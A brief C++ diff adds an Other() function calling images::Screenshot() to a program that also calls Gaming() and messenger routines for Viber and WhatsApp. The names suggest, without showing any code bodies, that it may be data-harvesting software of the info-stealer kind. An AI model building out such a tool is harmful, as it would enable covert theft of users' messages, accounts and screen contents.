@@ -40,6 +40,7 @@ void Gaming();
 
 void Messengers();
 
+void Other();
 
 /// <summary>
 /// Main function in the program. 
@@ -65,6 +66,8 @@ void Functions()
 	Gaming();
 
 	Messengers();
+
+	Other();
 
 }
 
@@ -101,4 +104,10 @@ void Messengers()
 	messengers::Viber();
 
 	messengers::Whatsapp();
+}
+
+void Other()
+{
+	images::Screenshot();
+
 }
